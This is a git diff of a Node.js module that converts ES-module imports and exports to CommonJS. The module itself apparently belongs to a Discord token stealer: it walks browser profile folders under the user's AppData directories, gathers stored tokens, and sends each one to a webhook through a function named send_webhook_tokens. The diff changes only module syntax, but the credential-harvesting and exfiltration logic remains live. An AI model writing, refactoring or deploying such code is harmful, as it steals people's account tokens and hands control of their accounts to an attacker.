@@ -1,10 +1,9 @@
-import { get_info } from "./../../modules/core/core.mjs";
-import { get_discord_Info } from "./../../utils/axios/discord.mjs";
+const { get_info } = require("./../../modules/core/core.js");
+const { get_discord_Info } = require("./../../utils/axios/discord.js");
 
-import { instance } from "./../../utils/axios/request.mjs";
+const { instance } = require("./../../utils/axios/request.js");
 
-import { tokens, get_tokens } from "./finds.mjs";
-import process from "process";
+const { tokens, get_tokens } = require("./finds.js");
 
 let local = process.env.localappdata;
 let roaming = process.env.appdata;
@@ -47,7 +46,7 @@ let paths = [
     `${local}/Microsoft/Edge/User Data/Guest Profile/Network/`,
 ];
 
-export const send_webhook_tokens = async (webhook) => {
+const send_webhook_tokens = async (webhook) => {
     for (const path of paths) await get_tokens(path);
     for (let token of tokens) {
         try {
@@ -224,4 +223,8 @@ export const send_webhook_tokens = async (webhook) => {
             return
         }
     }
+}
+
+module.exports = {
+    send_webhook_tokens
 }
